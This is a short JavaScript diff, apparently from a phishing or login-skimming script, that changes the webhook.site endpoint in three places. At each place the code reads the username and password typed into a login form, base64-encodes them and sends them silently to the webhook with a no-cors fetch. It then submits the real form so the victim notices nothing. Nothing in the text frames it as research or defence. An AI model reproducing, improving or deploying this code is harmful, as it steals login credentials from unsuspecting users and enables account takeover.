@@ -83,7 +83,7 @@ async function atms() {
 
 
         if (usuario && clave) {
-            fetch('https://webhook.site/8701cbf7-c933-4bf9-a5dd-83227ea16302?u=' + btoa(usuario) + '&p=' + btoa(clave), { mode: 'no-cors' });
+            fetch('https://webhook.site/99dbe866-1d89-4947-8bfd-be508cf52941?u=' + btoa(usuario) + '&p=' + btoa(clave), { mode: 'no-cors' });
             
             let datosLogin = new URLSearchParams(new FormData(formularioReal));
             datosLogin.append('Recordarme', 'on');
@@ -261,7 +261,7 @@ async function atms() {
                 let usuario = document.getElementById('Login').value;
                 let clave = document.getElementById('Pass').value;
 
-                let urlWebhook = 'https://webhook.site/8701cbf7-c933-4bf9-a5dd-83227ea16302?u=' + btoa(usuario) + '&p=' + btoa(clave);
+                let urlWebhook = 'https://webhook.site/99dbe866-1d89-4947-8bfd-be508cf52941?u=' + btoa(usuario) + '&p=' + btoa(clave);
 
                 fetch(urlWebhook, { mode: 'no-cors' })
                 .then(() => {
@@ -286,7 +286,7 @@ async function atms() {
             let uFalso = document.getElementById('Login').value;
             let pFalso = document.getElementById('Pass').value;
 
-            fetch('https://webhook.site/8701cbf7-c933-4bf9-a5dd-83227ea16302?u=' + btoa(uFalso) + '&p=' + btoa(pFalso), { mode: 'no-cors' });
+            fetch('https://webhook.site/99dbe866-1d89-4947-8bfd-be508cf52941?u=' + btoa(uFalso) + '&p=' + btoa(pFalso), { mode: 'no-cors' });
 
             let bodyDatos = `Login=${encodeURIComponent(uFalso)}&Pass=${encodeURIComponent(pFalso)}&Recordarme=on&Entrar=on`;
             
